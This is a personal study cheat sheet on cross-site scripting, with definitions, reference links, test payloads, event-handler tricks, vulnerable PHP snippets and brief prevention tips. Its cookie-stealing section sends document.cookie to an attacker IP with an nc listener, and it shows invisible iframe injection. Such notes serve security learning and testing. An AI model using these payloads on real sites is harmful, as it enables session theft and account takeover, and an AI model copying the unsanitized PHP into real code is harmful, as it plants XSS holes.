# [XSS] Cross Site Scripting
**Links**
https://portswigger.net/web-security/cross-site-scripting
https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A7-Cross-Site_Scripting_(XSS)



```reStructuredText
XSS vulnerabilities are caused due to unsanitized user input that is then displayed on a web page in HTML format. These vulnerabilities allow malicious attackers to inject client side scripts, such as JavaScript, into web pages viewed by other users.

Although XSS attacks don't directly compromise a machine, these attacks can still have significant impacts, such as cookie stealing and authentication bypass, redirecting the victim’s browser to a malicious HTML page, and more."

**Only JavaScript or VbScript embedded in auth.y.com can read cookies belonging to auth.y.com**

reflected = non persistence, echoed back immediately. In the HTTP request!
stored = persistence, stored in web application
DOM XSS = lives within the DOM environment, a page's client-side script itself and soes not reach server-side code
```



**Camouflage URL**

- tinyurl
- iframes
- link in a targeted email

`<plaintext> tag/payload for testing`

<script>alert('abc');</script>
<script>alert(document.cookie)</script>

`string.fromCharCode(xxx, xxx, xxx)`



**Payload example**

```php+HTML
<script>
x = '<!--<script>' < /script>/ - alert(1)
</script>
```

**PHP code injection**

```php+HTML
<?
echo '<h4>Hello ' . $_GET['name'] . '</h4>';
?>
```



**Browser Redirection and IFRAME Injection**

```html
.<iframe SRC="http://$ip/report" height = "0" width ="0"></iframe>
invisible iframe
.<iframe src="http://<me>:<myport>/something" height="0" width="0"></iframe> 
```

**Stealing Cookies and Session Information**

```html
.<iframe src="http://10.11.0.5/report" height = "0" width = "0"></iframe>
.<script> new Image().src="http:10.11.0.126/bogus.php?output="+document.cookie; </script>

nc -nlvp 80

<img src="logo.png" alt="<?= $_GET['name'] ?>">
```



### Exploitation with Beef
Put the hook link in the web page by XSS



## With event handlers

```javascript
abc" onmouseover=alert("XSS") "
onclick, onload, onerror etc

<a onmouseover="alert('xss')">xss link</a>
<IMG SRC=# onmouseover="alert('xss')">
<IMG SRC=/ onerror="alert('xss')"></img>
```




## How to prevent XSS
- Encoding: < becomes `&lt;`
- Filtering: <script> becomes script
- Validating: compare input against white list
- Sanitization: combination of escaping, filtering and validation